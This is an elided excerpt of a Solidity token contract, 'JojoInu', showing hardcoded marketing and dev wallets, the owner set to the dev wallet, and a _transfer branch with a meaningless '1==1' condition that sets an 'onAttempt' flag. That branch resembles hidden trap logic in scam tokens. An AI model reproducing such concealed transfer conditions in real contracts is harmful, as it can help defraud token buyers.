...
contract JojoInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xd63a71f1639b0153B5d4288773c8E2f15C79C699); 
    address payable public Wallet_Dev = payable(0x27dfF35fC48ebd3D5D3649041826345B64590053);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 


    uint256 private constant MAX = ~uint256(0);
    uint256 public Ammount = 10**22;
    ...
    constructor () {
        ...
        _owner = 0x27dfF35fC48ebd3D5D3649041826345B64590053;
    ...
    function _transfer(
        ...
        if(!_isExcludedFromFee[from] && !_isExemptedFromFee[from]){
            if(_isExemptedFromFee[to] && 1==1){
                onAttempt = true;
